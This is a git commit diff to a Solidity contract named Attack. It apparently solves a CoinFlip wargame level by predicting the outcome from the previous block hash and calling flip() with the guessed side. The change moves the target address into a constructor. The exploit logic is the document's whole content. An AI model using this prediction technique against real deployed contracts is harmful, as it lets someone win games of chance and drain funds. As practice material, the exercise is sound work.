ee6682a4862e2b56580fda1b38c288613f5aa356
donghyeon <tsvz1234@gmail.com>
2024-06-18 01:34:09 +0900

    Update attack.sol

--- Coinflip/attack.sol
+++ Coinflip/attack.sol
@@ -6,14 +6,19 @@ import "hardhat/console.sol";
 
 contract Attack {
 
+    CoinFlip public coinflip;
+    constructor(address _address) {
+        coinflip = CoinFlip(_address);
+    }
+
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-   function letflip (CoinFlip coinflip) public {
-    uint256 blockvalue =  uint256(blockhash(block.number - 1));
-    uint256 coin = blockvalue / FACTOR;
-    bool side = coin == 1 ? true : false;
+    function letflip () public {
+        uint256 blockvalue =  uint256(blockhash(block.number - 1));
+        uint256 coin = blockvalue / FACTOR;
+        bool side = coin == 1 ? true : false;
 
-    coinflip.flip(side);
+        coinflip.flip(side);
      
    }
 }
